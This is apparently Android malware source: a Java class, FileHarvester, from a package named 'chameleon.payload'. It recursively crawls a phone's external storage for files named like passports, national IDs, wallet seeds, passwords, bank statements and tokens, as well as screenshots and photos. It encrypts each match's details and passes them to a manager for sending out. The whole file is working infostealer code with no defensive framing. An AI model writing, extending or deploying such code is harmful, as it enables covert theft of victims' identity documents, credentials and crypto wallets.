package com.chameleon.payload.harvester;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONObject;
import java.io.*;

public class FileHarvester {
    private static final String TAG = "FileHarvester";
    private final Context context;
    private final HarvesterManager manager;

    private static final String[] KEYWORDS = {
        "passport", "nid", "national_id", "seed", "wallet",
        "password", "backup", "secret", "key", "token",
        "crypto", "bank", "statement", "tax", "id_",
        "scan", "document", "resume", "cv", "contract"
    };

    private static final String[] EXTENSIONS = {
        ".jpg", ".jpeg", ".png", ".pdf", ".doc", ".docx",
        ".xls", ".xlsx", ".txt", ".csv", ".xml", ".json"
    };

    public FileHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    public void collectFiles() {
        Log.i(TAG, "Collecting files from storage...");
        try {
            String storagePath = Environment.getExternalStorageDirectory().getAbsolutePath();
            crawlDirectory(new File(storagePath), 0);
        } catch (Exception e) {
            Log.e(TAG, "File collection error", e);
        }
    }

    private void crawlDirectory(File dir, int depth) {
        if (depth > 4) return;
        if (dir == null || !dir.exists()) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            try {
                if (file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    if (!name.startsWith(".") && !name.equals("android") && !name.equals("obb")) {
                        crawlDirectory(file, depth + 1);
                    }
                } else if (matchesKeywords(file)) {
                    reportFile(file);
                }
            } catch (Exception ignored) {}
        }
    }

    private boolean matchesKeywords(File file) {
        String name = file.getName().toLowerCase();
        for (String ext : EXTENSIONS) {
            if (name.endsWith(ext)) {
                for (String kw : KEYWORDS) {
                    if (name.contains(kw)) return true;
                }
                // Return true for recent screenshots and photos too
                if (name.startsWith("screenshot") || name.startsWith("photo") || name.startsWith("img")) {
                    return file.length() < 5 * 1024 * 1024;
                }
            }
        }
        return false;
    }

    private void reportFile(File file) {
        try {
            JSONObject data = new JSONObject();
            data.put("file_path", file.getAbsolutePath());
            data.put("file_size", file.length());
            String name = file.getName().toLowerCase();
            if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png")) {
                data.put("file_type", "photo");
            } else if (name.endsWith(".pdf")) {
                data.put("file_type", "pdf");
            } else if (name.endsWith(".doc") || name.endsWith(".docx")) {
                data.put("file_type", "document");
            } else {
                data.put("file_type", "other");
            }

            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("file", encrypted);
            Log.d(TAG, "File: " + file.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Report error", e);
        }
    }
}
